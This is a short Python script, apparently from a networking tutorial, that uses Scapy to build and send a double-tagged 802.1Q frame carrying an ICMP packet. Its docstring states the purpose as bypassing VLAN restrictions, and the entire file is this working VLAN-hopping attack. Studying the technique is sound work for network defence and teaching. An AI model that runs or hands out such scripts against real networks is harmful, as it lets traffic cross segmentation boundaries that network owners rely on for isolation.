#!venv/bin/python

from scapy.all import * # import of the Scapy lib
from scapy.all import Ether, Dot1Q, IP, ICMP
import settings # import of the "setting.py" file
"""
Bypass vlan restriction by encapsulation .1q into .1q
"""

dot1_tags = Ether(dst=settings.mac_dest) # Create an empty Ethernet packet
for vlan_id in settings.vlans: # add the 802.1q headers for the VLANs. Cf "setting.py"
    dot1_tags = dot1_tags/Dot1Q(vlan=vlan_id)

# Append the Ethernet (with his multiples 802.1q headers), an IP and ICMP packet.
pck = dot1_tags/IP(dst=settings.destination_ip)/ICMP() 
pck.show() # this command is used to show the packet (we will discuss the output)
sendp(pck, iface=settings.source_interface) # the sendp function is used over Layer 2
